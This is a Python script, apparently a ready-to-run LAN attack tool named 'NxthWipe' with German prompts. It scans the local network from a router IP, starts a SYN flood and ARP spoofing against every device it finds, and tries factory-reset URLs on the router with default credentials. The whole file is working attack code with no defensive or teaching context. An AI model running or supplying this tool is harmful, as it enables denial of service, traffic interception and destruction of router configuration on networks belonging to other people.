#!/usr/bin/env python3
# Author: LXXNDX-PXNDX
import threading
import time
import random
import os
import sys
from scapy.all import IP, TCP, send, srp, ARP, Ether, conf

conf.verb = 0

class NxthWipeCLI:
    def __init__(self):
        self.running = True
        self.attack_threads = []

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def log(self, msg):
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

    def get_network_range(self, router_ip):
        parts = router_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    def arp_scan(self, network):
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]
        return [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]

    def syn_flood(self, target_ip, duration=30):
        end_time = time.time() + duration
        while time.time() < end_time and self.running:
            sport = random.randint(1024, 65535)
            ip = IP(dst=target_ip)
            tcp = TCP(sport=sport, dport=80, flags="S", seq=random.randint(1000, 5000))
            send(ip/tcp, verbose=0, count=1)

    def arp_spoof(self, target_ip, router_ip):
        target_mac = self.get_mac(target_ip)
        router_mac = self.get_mac(router_ip)
        if not target_mac or not router_mac:
            self.log(f"MAC nicht gefunden für {target_ip} oder {router_ip}")
            return
        while self.running:
            send(ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac), verbose=0)
            send(ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac), verbose=0)
            time.sleep(2)

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        if ans:
            return ans[0][1].hwsrc
        return None

    def router_reset(self, router_ip):
        import requests
        from requests.auth import HTTPBasicAuth
        urls = [f"http://{router_ip}/cgi-bin/reboot?factory=1",
                f"http://{router_ip}/reset.htm",
                f"http://{router_ip}/goform/reset"]
        defaults = [("admin","admin"), ("admin",""), ("root","admin"), ("user","user")]
        for url in urls:
            for user, pw in defaults:
                try:
                    requests.get(url, auth=HTTPBasicAuth(user, pw), timeout=2)
                    self.log(f"Reset versucht: {url}")
                except:
                    pass

    def start_attack(self, router_ip):
        self.running = True
        self.log(f"Starte Zerstörung auf Router {router_ip}")
        network = self.get_network_range(router_ip)
        self.log(f"Scanne {network}")
        devices = self.arp_scan(network)
        self.log(f"Gefunden: {len(devices)} Geräte")
        for dev in devices:
            t1 = threading.Thread(target=self.syn_flood, args=(dev['ip'], 60), daemon=True)
            t2 = threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip), daemon=True)
            t1.start()
            t2.start()
            self.attack_threads.extend([t1, t2])
            time.sleep(0.5)
        t_reset = threading.Thread(target=self.router_reset, args=(router_ip,), daemon=True)
        t_reset.start()
        self.attack_threads.append(t_reset)
        self.log("Alle Angriffe gestartet. Drücke Enter, um zu stoppen.")
        input()
        self.running = False
        self.log("Stoppe Angriffe...")
        sys.exit(0)

    def run(self):
        self.clear_screen()
        print("""
╔═══════════════════════════════════════╗
║       NxthWipe – Terminal Edition     ║
║         von LXXNDX-PXNDX              ║
╚═══════════════════════════════════════╝
""")
        router_ip = input("Router IP (z.B. 192.168.1.1): ").strip()
        if not router_ip:
            print("Keine IP eingegeben.")
            return
        print("\nAngriff startet in 3 Sekunden... Drücke Ctrl+C zum Abbrechen.\n")
        time.sleep(3)
        try:
            self.start_attack(router_ip)
        except KeyboardInterrupt:
            self.running = False
            print("\nAbgebrochen.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Dieses Tool benötigt root-Rechte. Starte mit: sudo python3 NxthWipe.py")
        sys.exit(1)
    cli = NxthWipeCLI()
    cli.run()
